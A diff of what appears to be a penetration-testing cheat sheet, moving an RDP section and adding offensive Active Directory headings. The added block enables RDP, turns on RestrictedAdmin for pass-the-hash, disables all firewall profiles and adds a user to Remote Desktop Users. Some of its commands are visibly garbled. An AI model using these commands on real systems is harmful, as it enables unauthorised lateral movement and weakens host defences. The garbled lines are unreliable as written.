@@ -270,11 +270,11 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [BloodHound](#bloodhound)
     - [Mimikatz](#mimikatz-1)
     - [Active Directory Authentication Attacks](#active-directory-authentication-attacks)
-    - See: [Windows Privilege Escalation](#windows-privilege-escalation)
     - [Lateral Movement Techniques and Pivoting](#lateral-movement-techniques-and-pivoting)
     - [Credentials Harvesting](#credentials-harvesting)
+    - [Offensive .NET](#offensive-net)
     - [Active Directory Persistence](#active-directory-persistence)
-    - [Remote Desktop](#remote-desktop)
+    - [Active Directory Privilege Escalation](#active-directory-privilege-escalation)
 - [Mobile](#mobile)
   - [Missing Certificate and Public Key Pinning](#missing-certificate-and-public-key-pinning)
   - [Cordova attacks](#cordova-attacks)
@@ -494,6 +494,18 @@ SYSVOL is a folder that exists on all domain controllers. It is a shared folder 
 - `xfreerdp /u:username /p:password /d:domain.com /v:IP`
 - `rdesktop -u username -p password IP`
 - `remmina`
+- ```PowerShell
+  # enable RDP
+  Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+
+  # enable RDP pass the hash
+  New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" PropertyType DWORD -Force
+
+  # enable RDP and add user
+  reg add "HEY_LOCAL _MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" / fDenyTSConnections /t REG_DWORD /d 0 /f
+  reg add HKLM\System \CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f netsh advfirewall set allprofiles state off
+  net localgroup "remote desktop users" <USER. NAME> / add
+  ```
 
 #### <ins>SQL connections</ins>
 
@@ -8027,19 +8039,7 @@ Process
 
 
 
-### <ins>Remote Desktop</ins>
-```PowerShell
-# enable RDP
-Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
 
-# enable RDP pass the hash
-New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" PropertyType DWORD -Force
-
-# enable RDP and add user
-reg add "HEY_LOCAL _MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" / fDenyTSConnections /t REG_DWORD /d 0 /f
-reg add HKLM\System \CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f netsh advfirewall set allprofiles state off
-net localgroup "remote desktop users" <USER. NAME> / add
-```
 
 
 ## Mobile
